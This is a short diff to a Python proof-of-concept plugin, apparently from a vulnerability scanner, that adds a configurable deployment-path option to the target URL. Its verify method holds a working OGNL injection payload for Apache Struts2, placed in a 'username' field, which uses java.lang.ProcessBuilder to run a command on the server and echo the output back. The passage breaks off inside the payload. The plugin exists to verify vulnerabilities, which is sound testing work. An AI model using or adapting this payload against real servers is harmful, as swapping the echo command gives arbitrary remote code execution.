@@ -28,8 +28,21 @@ class Poc(ABPoc):
 
     def __init__(self):
         super(Poc, self).__init__(Vuln())
-
+        self.option_schema = {
+            'properties': {
+                'base_path': {
+                    'type': 'string',
+                    'description': '部署路径',
+                    'default': '',
+                    '$default_ref': {
+                        'property': 'deploy_path'
+                    }
+                }
+            }
+        }
+                    
     def verify(self):
+        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
             data = {'username': '''
             %{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"echo","92933839f1efb2da9a4799753ee8d79c"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
